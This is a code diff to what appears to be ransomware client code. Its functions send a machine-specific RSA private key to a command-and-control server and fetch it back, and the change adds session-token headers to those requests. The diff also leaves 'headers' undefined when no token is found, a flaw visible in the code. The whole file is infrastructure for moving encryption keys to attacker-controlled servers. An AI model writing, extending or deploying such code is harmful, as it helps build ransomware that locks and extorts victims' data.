@@ -6,6 +6,7 @@ import json
 import uuid
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
+from Session_Handling import read_session_token
 from Variables import c2_server, rsa_key, api_key, wrong_api_key
 
 ####################################################################################################################
@@ -21,9 +22,14 @@ def send_private_key_to_c2(private_key):
     # Rename of the private key
     unique_id = get_machine_identifier()
     renamed_key = f"{unique_id}_private.pem"
-    headers = {
-    'API-KEY': api_key,
-    }
+    session_token = read_session_token()
+    if session_token:
+        headers = {
+        'API-KEY': api_key,
+        'Session-Token' : session_token
+        }
+    else:
+        print("No session token") # Debug Message
 
     try:
         # Sending the private key to c2 server
@@ -68,9 +74,15 @@ def get_machine_identifier():
 def fetch_and_load_private_key():
     unique_id = get_machine_identifier()
     renamed_key = f"{unique_id}_private.pem"
-    headers = {
-    'API-KEY': api_key,
-    }
+    session_token = read_session_token()
+    if session_token:
+        headers = {
+        'API-KEY': api_key,
+        'Session-Token' : session_token
+        }
+    else:
+        print("No session token") # Debug Message
+
     url = f"{c2_server}/get_key/{renamed_key}"
     try:
         resp = requests.get(url, headers=headers)
